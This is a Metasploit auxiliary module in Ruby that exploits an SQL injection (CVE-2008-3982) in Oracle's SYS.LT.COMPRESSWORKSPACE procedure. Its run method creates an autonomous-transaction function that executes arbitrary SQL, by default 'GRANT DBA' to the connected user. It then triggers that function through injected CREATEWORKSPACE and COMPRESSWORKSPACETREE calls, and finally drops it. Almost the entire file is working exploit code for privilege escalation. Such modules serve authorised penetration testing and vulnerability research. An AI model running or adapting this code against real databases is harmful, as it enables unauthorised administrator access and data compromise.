##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Oracle DB SQL Injection via SYS.LT.COMPRESSWORKSPACE',
        'Description' => %q{
          This module exploits an sql injection flaw in the COMPRESSWORKSPACE
          procedure of the PL/SQL package SYS.LT. Any user with execute
          privilege on the vulnerable package can exploit this vulnerability.
        },
        'Author' => [ 'CG' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2008-3982'],
          [ 'OSVDB', '49324'],
          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2008.html' ]
        ],
        'DisclosureDate' => '2008-10-13',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('SQL', [ false, 'SQL to execte.', "GRANT DBA to #{datastore['DBUSER']}"]),
      ]
    )
  end

  def run
    return if !check_dependencies

    name = Rex::Text.rand_text_alpha_upper(1..10)
    cruft = Rex::Text.rand_text_alpha_upper(1)

    function = "
      CREATE OR REPLACE FUNCTION #{cruft}
      RETURN VARCHAR2 AUTHID CURRENT_USER
      AS
      PRAGMA AUTONOMOUS_TRANSACTION;
      BEGIN
      EXECUTE IMMEDIATE '#{datastore['SQL']}';
      COMMIT;
      RETURN '#{cruft}';
      END;"

    package1 = "BEGIN SYS.LT.CREATEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}'); END;"

    package2 = "BEGIN SYS.LT.COMPRESSWORKSPACETREE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}'); END;"

    clean = "DROP FUNCTION #{cruft}"

    print_status('Attempting sql injection on SYS.LT.COMPRESSWORKSPACE...')

    print_status('Sending function...')
    prepare_exec(function)

    begin
      prepare_exec(package1)
      prepare_exec(package2)
    rescue StandardError => e
      if (e.to_s =~ /No Data/)
        print_status("Removing function '#{cruft}'...")
        prepare_exec(clean)
      else
        return
      end
    end
  end
end
